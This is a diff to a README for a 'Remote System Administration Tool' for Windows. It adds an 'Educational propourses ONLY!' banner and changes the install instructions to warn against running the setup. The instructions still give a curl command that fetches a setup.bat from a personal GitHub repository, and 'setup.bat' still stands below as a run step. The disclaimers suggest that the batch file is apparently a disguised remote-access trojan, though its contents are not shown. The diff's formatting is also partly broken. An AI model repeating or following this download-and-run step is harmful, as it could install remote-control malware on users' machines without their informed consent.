@@ -1,4 +1,20 @@
 
+
+
+
+
+# Educational propourses ONLY!
+
+
+
+
+
+
+
+
+
+
+
 # Remote System Administration Tool
 
 A lightweight, professional remote administration framework for Windows systems management and monitoring.
@@ -52,8 +68,8 @@ This tool provides system administrators with comprehensive remote management ca
 1. **Download the installer:**
 ```bash
 curl -O https://raw.githubusercontent.com/icyyboy/wss-test-/main/setup.bat
-Run the setup:
-cmd
+Dont run the setup just test the file in a safe envoirement.
+
 
 setup.bat
 The installer will:
